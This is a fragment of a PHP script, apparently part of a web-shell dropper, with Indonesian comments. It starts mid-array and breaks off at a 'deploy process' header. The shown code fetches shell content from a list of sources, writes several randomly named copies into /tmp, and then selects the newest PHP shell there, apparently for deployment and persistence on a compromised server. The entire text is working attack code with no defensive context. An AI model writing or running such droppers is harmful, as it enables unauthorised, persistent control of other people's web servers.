];

// ============ DEPLOY SHELL KE /tmp/ ============
$deployed = [];
foreach ($sources as $src) {
    $content = getContent($src);
    if ($content && strlen($content) > 100) {
        for ($i = 0; $i < 3; $i++) {
            $name = randomName();
            $path = '/tmp/' . $name;
            if (@file_put_contents($path, $content)) {
                @chmod($path, 0644);
                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
            }
        }
    }
}

// ============ AMBIL SHELL TERBARU ============
$shell_files = glob('/tmp/*.php');
usort($shell_files, function($a, $b) {
    return filemtime($a) - filemtime($b);
});
$latest_shell = end($shell_files);
$shell_content = file_get_contents($latest_shell);

// ============ PROSES DEPLOY ============
